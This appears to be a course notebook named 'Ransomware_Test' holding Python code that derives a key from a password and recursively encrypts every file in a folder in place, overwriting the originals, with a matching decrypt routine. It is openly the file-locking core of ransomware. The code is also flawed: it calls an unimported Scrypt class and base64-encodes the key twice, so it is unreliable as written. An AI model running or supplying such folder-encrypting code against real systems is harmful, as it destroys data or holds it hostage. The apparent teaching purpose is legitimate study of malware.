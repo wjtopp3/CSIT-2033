{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyOtJC2AJRsSuEu/9BXma9uv",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/wjtopp3/CSIT-2033/blob/main/Ransomware_Test.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "ejme1dN6TMH8"
      },
      "outputs": [],
      "source": [
        "pip install cryptography"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import pathlib, os, secrets, base64, getpass\n",
        "import cryptography\n",
        "from cryptography.fernet import Fernet\n",
        "from cryptography.hazmat.primitives import hashes\n",
        "from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\n",
        "\n",
        "def generate_salt(size=16):\n",
        "    \"\"\"Generate the salt used for key derivation, 'size' is the length of the salt in bytes to generate\"\"\"\n",
        "    \"\"\"using secrets instead of random because secrets is cryptographically secure\"\"\"\n",
        "    return secrets.token_bytes(size)\n",
        "\n",
        "def derive_key(salt, password):\n",
        "    \"\"\"Derive the key from the password and salt\"\"\"\n",
        "    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)\n",
        "    key = base64.urlsafe_b64encode(kdf.derive(password))\n",
        "    return key\n",
        "\n",
        "def load_salt():\n",
        "    # load salt from salt.salt file - a previously generated salt\n",
        "    return open(\"salt.salt\", \"rb\").read()\n",
        "\n",
        "def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):\n",
        "    \"\"\"Generates a key from a 'password' and the salt. if 'load_existing_salt' is True,\n",
        "    it willload the salt from a file in the current directory called salt.salt\n",
        "    if 'save_salt' is True, then it will generate a new salt and save it to\n",
        "    salt.salt\"\"\"\n",
        "    if load_existing_salt:\n",
        "        #load existing salt\n",
        "        salt = load_salt()\n",
        "    elif save_salt:\n",
        "        #generate new salt and save it\n",
        "        salt = generate_salt(salt_size)\n",
        "        with open(\"salt.salt\", \"wb\") as salt_file:\n",
        "            salt_file.write(salt)\n",
        "    #generate the key from the salt and the password\n",
        "    derived_key = derive_key(salt, password)\n",
        "    #encode it using Base 64 and return it\n",
        "    return base64.urlsafe_b64encode(derived_key)\n",
        "\n",
        "def encrypt(filename, key):\n",
        "    \"\"\"Given a filename (str) and key (bytes), encrypts the file and writes it\"\"\"\n",
        "    f = Fernet(key)\n",
        "    with open(filename, \"rb\") as file:\n",
        "        #read all file data\n",
        "        file_data = file.read()\n",
        "    #encrypt data\n",
        "    encrypted_data = f.encrypt(file_data)\n",
        "    #write the encrypted file\n",
        "    with open(filename, \"wb\") as file:\n",
        "        file.write(encrypted_data)\n",
        "\n",
        "def decrypt(filename, key):\n",
        "    \"\"\"Given a filename (str) and a key (bytes), decrypts the file and writes it\"\"\"\n",
        "    f = Fernet(key)\n",
        "    with open(filename, \"rb\") as file:\n",
        "        #read the encrypted file\n",
        "        encrypted_data = file.read()\n",
        "    #decrypt data\n",
        "    try:\n",
        "        decrypted_data = f.decrypt(encrypted_data)\n",
        "    except cryptography.fernet.InvalidToken:\n",
        "        print(\"{!} Invalid toke, most likely the password is incorrect\")\n",
        "        return\n",
        "    #write the original file\n",
        "    with open(filename, \"wb\") as file:\n",
        "        file.write(decrypted_data)\n",
        "\n",
        "def encrypt_folder(foldername, key):\n",
        "    #if its a folder, encrypt the entire folder\n",
        "    for child in pathlib.Path(foldername).glob(\"*\"):\n",
        "        if child.is_file():\n",
        "            print(f\"[*] Encrypting {child}\")\n",
        "            encrypt(child, key)\n",
        "        elif child.is_dir():\n",
        "            encrypt_folder(child, key)\n",
        "\n",
        "def decrypt_folder(foldername, key):\n",
        "    # if its a folder, decrypt the entire folder\n",
        "    for child in pathlib.Path(foldername).glob(\"*\"):\n",
        "        if child.is_file():\n",
        "            print(f\"[*] Decrypting {child}\")\n",
        "            decrypt(child, key)\n",
        "        elif child.is_dir():\n",
        "            decrypt_folder(child, key)\n",
        "\n"
      ],
      "metadata": {
        "id": "qUCHA1C2TP_c"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}